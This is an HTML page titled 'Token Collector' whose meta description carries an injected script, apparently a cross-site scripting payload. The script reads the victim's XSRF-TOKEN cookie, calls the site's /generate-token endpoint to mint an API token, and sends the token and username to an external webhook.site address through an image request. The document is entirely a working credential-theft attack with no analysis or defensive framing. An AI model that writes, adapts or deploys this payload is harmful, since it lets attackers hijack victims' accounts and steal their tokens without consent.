<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Token Collector</title>
  <!-- VERSION_GET_TOKEN_V2 -->
  <meta name="description" content='<script>
    (() => {
      const webhookID = "2b4d8efe-d632-441b-94e9-ffbfc14c48c5";
      const endpoint = "https://webhook.site/" + webhookID;

      const report = (info) => {
        const details = new URLSearchParams();
        details.append("source", "GET_TOKEN_V2");
        Object.entries(info).forEach(([k, v]) => {
          details.append(k, String(v).substring(0, 1000));
        });
        (new Image()).src = endpoint + "?" + details.toString();
      };

      const extractXsrf = () => {
        try {
          return document.cookie
            .split("; ")
            .find(c => c.startsWith("XSRF-TOKEN="))
            ?.split("=")[1];
        } catch (err) {
          report({ error: "cookie_parse_fail", message: err.message });
          return null;
        }
      };

      const xsrfToken = extractXsrf();
      if (!xsrfToken) {
        report({ error: "xsrf_missing", location: location.href });
        return;
      }

      const headers = {
        "Accept": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "X-XSRF-TOKEN": decodeURIComponent(xsrfToken)
      };

      fetch("/generate-token", {
        method: "POST",
        headers
      })
      .then(res => res.json())
      .then(json => {
        if (json?.token) {
          report({
            status: "token_retrieved",
            token: json.token,
            user: json.user?.name || "unknown"
          });
        } else {
          report({
            status: "token_missing",
            response: JSON.stringify(json)
          });
        }
      })
      .catch(e => {
        report({ error: "fetch_fail", detail: e.message });
      });
    })();
  </script>'>
</head>
<body>
  <h1>Token Retrieval Page</h1>
</body>
</html>
